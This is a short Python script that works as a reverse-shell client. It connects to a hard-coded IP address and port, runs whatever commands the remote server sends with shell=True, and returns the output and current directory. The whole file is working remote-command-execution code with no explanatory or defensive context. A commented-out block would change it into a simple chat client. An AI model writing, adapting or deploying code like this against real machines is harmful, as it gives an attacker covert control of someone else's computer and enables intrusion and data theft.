import socket
import os
import subprocess

s = socket.socket()
host = '192.168.43.24' # input("Enter server IP Address")
port = 9999

s.connect((host, port))

while True:
    received_data = s.recv(1024)
    if received_data[:2].decode("utf-8") == 'cd':
        os.chdir(received_data[3:].decode("utf-8"))

##### In order to use this client program to start conversation #####
##### Uncomment below block of code ###############
        
        
##    print(received_data[:].decode("utf-8"),end="\n")
##    ans=input(">")
##    s.sendall(str.encode(ans))

    if len(received_data) > 0:
        cmd = subprocess.Popen(received_data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.sendall(str.encode(output_str + currentWD))
        

